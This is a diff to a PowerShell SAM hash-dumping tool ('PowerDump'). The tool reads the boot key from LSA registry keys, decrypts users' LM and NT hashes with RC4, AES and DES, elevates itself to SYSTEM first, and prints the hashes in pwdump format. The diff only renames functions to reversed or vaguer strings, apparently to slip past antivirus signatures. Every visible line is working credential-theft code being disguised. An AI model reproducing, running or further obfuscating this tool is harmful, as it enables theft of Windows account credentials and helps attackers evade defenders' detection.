@@ -12,7 +12,7 @@ public static class priv
 }
 "@
     $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru
-    function ElevatePrivs
+    function GetThosePrivileges
     {
 $signature = @" 
     [StructLayout(LayoutKind.Sequential, Pack = 1)] 
@@ -136,7 +136,7 @@ $signature = @"
             [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
           } 
       }
-      function LoadApi
+      function LoadBytes
         {
         $oldErrorAction = $global:ErrorActionPreference;
         $global:ErrorActionPreference = "SilentlyContinue";
@@ -236,7 +236,7 @@ namespace PowerDump
           224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
           241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
         );
-        function sid_to_key($sid)
+        function yek_ot_dis($sid)
         {
             $s1 = @();
             $s1 += [char]($sid -band 0xFF);
@@ -249,9 +249,9 @@ namespace PowerDump
             $s2 = @();
             $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
             $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
-            return ,((str_to_key $s1),(str_to_key $s2));
+            return ,((yek_ot_rts $s1),(yek_ot_rts $s2));
         }
-        function str_to_key($s)
+        function yek_ot_rts($s)
         {
             $key = @();
             $key += [Shift]::Right([int]($s[0]), 1 );
@@ -268,7 +268,7 @@ namespace PowerDump
                 }
             return ,$key;
         }
-        function NewRC4([byte[]]$key)
+        function 4CRweN([byte[]]$key)
         {
             return new-object Object |
             Add-Member NoteProperty key $key -PassThru |
@@ -300,17 +300,17 @@ namespace PowerDump
             } -PassThru
         }
 
-        function des_encrypt([byte[]]$data, [byte[]]$key)
+        function tpyrcne_sed([byte[]]$data, [byte[]]$key)
         {
-            return ,(des_transform $data $key $true)
+            return ,(mrofsnart_sed $data $key $true)
         }
 
-        function des_decrypt([byte[]]$data, [byte[]]$key)
+        function tpyrced_sed([byte[]]$data, [byte[]]$key)
         {
-            return ,(des_transform $data $key $false)
+            return ,(mrofsnart_sed $data $key $false)
         }
 
-        function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
+        function mrofsnart_sed([byte[]]$data, [byte[]]$key, $doEncrypt)
         {
             $des = new-object Security.Cryptography.DESCryptoServiceProvider;
             $des.Mode = [Security.Cryptography.CipherMode]::ECB;
@@ -323,7 +323,7 @@ namespace PowerDump
             $result = $transform.TransformFinalBlock($data, 0, $data.Length);
             return ,$result;
         }
-        function Get-RegKeyClass([string]$key, [string]$subkey)
+        function ssalCyeKgeR-teG([string]$key, [string]$subkey)
         {
             switch ($Key) {
                 "HKCR" { $nKey = 0x80000000} #HK Classes Root
@@ -362,7 +362,7 @@ namespace PowerDump
             return $result;
         }
 
-        function RC4_Get-HBootKey
+        function yeKtooBH-teG_4CR
         {
             param([byte[]]$bootkey);
             $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
@@ -372,10 +372,10 @@ namespace PowerDump
             [byte[]]$F = $k.GetValue("F");
             if (-not $F) {return $null}
             $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
-            $rc4 = NewRC4 $rc4key;
+            $rc4 = 4CRweN $rc4key;
             return ,($rc4.encrypt($F[0x80..0xA0]));
         }
-        function RC4_DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+        function sehsaHtpyrceD_4CR($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
         {
             [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
             # LM Hash
@@ -384,7 +384,7 @@ namespace PowerDump
                 $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
             }
             else{
-                $lmhash = RC4_DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
+                $lmhash = hsaHelgniStpyrceD_4CR $rid $hbootkey $enc_lm_hash $almpassword;
             }
 
             # NT Hash
@@ -393,33 +393,33 @@ namespace PowerDump
                 $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
             }
             else{
-                $nthash = RC4_DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
+                $nthash = hsaHelgniStpyrceD_4CR $rid $hbootkey $enc_nt_hash $antpassword;
             }
             return ,($lmhash,$nthash)
         }
 
-        function RC4_DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+        function hsaHelgniStpyrceD_4CR($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
         {
-            $deskeys = sid_to_key $rid;
+            $deskeys = yek_ot_dis $rid;
             $md5 = [Security.Cryptography.MD5]::Create();
             $rc4_key = $md5.ComputeHash($hbootkey[0x00..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
-            $rc4 = NewRC4 $rc4_key;
+            $rc4 = 4CRweN $rc4_key;
             $obfkey = $rc4.encrypt($enc_hash[0x04..$(0x04+0x0f)]);
-            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
-                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
+            $hash = (tpyrced_sed  $obfkey[0..7] $deskeys[0]) +
+                (tpyrced_sed $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
             return ,$hash;
         }
 
-        function Get-BootKey
+        function yeKtooB-teG
         {
-            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
+            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{ssalCyeKgeR-teG "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
             $b = new-object byte[] $($s.Length/2);
             0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
             $b2 = new-object byte[] 16;
             0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
             return ,$b2;
         }
-        function Create-AesManagedObject($key, $IV) {
+        function tcejbOdeganaMseA-etaerC($key, $IV) {
             $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
@@ -444,17 +444,17 @@ namespace PowerDump
             $aesManaged
         }
 
-        function Decrypt-String($key, $encryptedStringWithIV) {
+        function gnirtS-tpyrceD($key, $encryptedStringWithIV) {
             $bytes = $encryptedStringWithIV
             $IV = $bytes[0x00..0x0f]
-            $aesManaged = Create-AesManagedObject $key $IV
+            $aesManaged = tcejbOdeganaMseA-etaerC $key $IV
             $decryptor = $aesManaged.CreateDecryptor();
             $unencryptedData = $decryptor.TransformFinalBlock($bytes,16, $bytes.Length - 16);
             $aesManaged.Dispose()
             $unencryptedData
 
         }
-        function Get-HBootKey
+        function yeKtooBH-teG
         {
             param([byte[]]$bootkey);
             $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
@@ -471,12 +471,12 @@ namespace PowerDump
             $iv = $F[$(0x78)..$(0x78+0x0f)]
             $key = $bootkey
             $iv_data = $iv+$data
-            $unencryptedData = Decrypt-String -key $key -encryptedStringWithIV $iv_data
+            $unencryptedData = gnirtS-tpyrceD -key $key -encryptedStringWithIV $iv_data
             return ,$unencryptedData
 
         }
 
-        function Get-UserName([byte[]]$V)
+        function emaNresU-teG([byte[]]$V)
         {
             if (-not $V) {return $null};
             $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
@@ -484,7 +484,7 @@ namespace PowerDump
             return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
         }
 
-        function Get-UserHashes($u, [byte[]]$hbootkey)
+        function sehsaHresU-teG($u, [byte[]]$hbootkey)
         {
             [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
 
@@ -493,21 +493,21 @@ namespace PowerDump
                 $enc_lm_hash = $u.V[$($u.lm_HashOffset)..$($u.lm_HashOffset+$u.lm_len)];
                  # If hash length = 0x38 then compute AES Hash
                 if ($u.nt_len -eq 0x38){
-                    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+                    return ,(sehsaHtpyrceD $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
                     }
                 # If hash length = 0x18 then compute RC4 Hash
                 elseif ($u.nt_len -eq 0x18){
-                    $hbootkey = RC4_Get-HBootKey
-                    return ,(RC4_DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+                    $hbootkey = yeKtooBH-teG_4CR
+                    return ,(sehsaHtpyrceD_4CR $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
                 }
             }
 
             else{
-                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+                return ,(sehsaHtpyrceD $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
             }
         }
 
-        function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+        function sehsaHtpyrceD($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
         {
             [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
             # LM Hash
@@ -516,7 +516,7 @@ namespace PowerDump
                 $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
             }
             else{
-                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash;
+                $lmhash = hsaHelgniStpyrceD $rid $hbootkey $enc_lm_hash;
             }
 
             # NT Hash
@@ -525,47 +525,47 @@ namespace PowerDump
                 $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
             }
             else{
-                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash;
+                $nthash = hsaHelgniStpyrceD $rid $hbootkey $enc_nt_hash;
             }
             return ,($lmhash,$nthash)
         }
 
-        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash)
+        function hsaHelgniStpyrceD($rid,[byte[]]$hbootkey,[byte[]]$enc_hash)
         {
-            $deskeys = sid_to_key $rid;
+            $deskeys = yek_ot_dis $rid;
             $key = $hbootkey[0x00..0x0f]
             $iv = $enc_hash[0x08..$(0x08+0x0f)]
             $data = $enc_hash[0x18..$(0x18+0x0f)]
             $data_iv = $iv+$data
 
-            $obfkey = Decrypt-String -key $key -encryptedStringWithIV $data_iv
-            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
-                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
+            $obfkey = gnirtS-tpyrceD -key $key -encryptedStringWithIV $data_iv
+            $hash = (tpyrced_sed  $obfkey[0..7] $deskeys[0]) +
+                (tpyrced_sed $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
             return ,$hash ;
 
         }
 
-        function Get-UserKeys
+        function syeKresU-teG
         {
             ls HKLM:\SAM\SAM\Domains\Account\Users |
                 where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
                     Add-Member AliasProperty KeyName PSChildName -PassThru |
                     Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                     Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
-                    Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
+                    Add-Member ScriptProperty UserName {emaNresU-teG($this.GetValue("V"))} -PassThru |
                     Add-Member ScriptProperty lm_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru |
                     Add-Member ScriptProperty lm_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa0..0xa3],0)} -PassThru |
                     Add-Member ScriptProperty nt_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa8..0xab],0) + 0xCC} -PassThru |
                     Add-Member ScriptProperty nt_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xac..0xaf],0)} -PassThru
         }
-        function DumpHashes
+        function sehsaHpmuD
         {
-            LoadApi
-            $bootkey = Get-BootKey;
-            $hbootKey = Get-HBootKey $bootkey;
-            $hashes = Get-UserHashes $_ $hBootKey
-            Get-UserKeys | %{
-                $hashes = Get-UserHashes $_ $hBootKey;
+            LoadBytes
+            $bootkey = yeKtooB-teG;
+            $hbootKey = yeKtooBH-teG $bootkey;
+            $hashes = sehsaHresU-teG $_ $hBootKey
+            syeKresU-teG | %{
+                $hashes = sehsaHresU-teG $_ $hBootKey;
                 "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
                     [System.BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
                     [System.BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
@@ -575,14 +575,14 @@ namespace PowerDump
         {
             if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
             {
-                DumpHashes
+                sehsaHpmuD
             }
             else
             {
-                ElevatePrivs
+                GetThosePrivileges
                 if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
                 {
-                    DumpHashes
+                    sehsaHpmuD
                 }
             }
         }
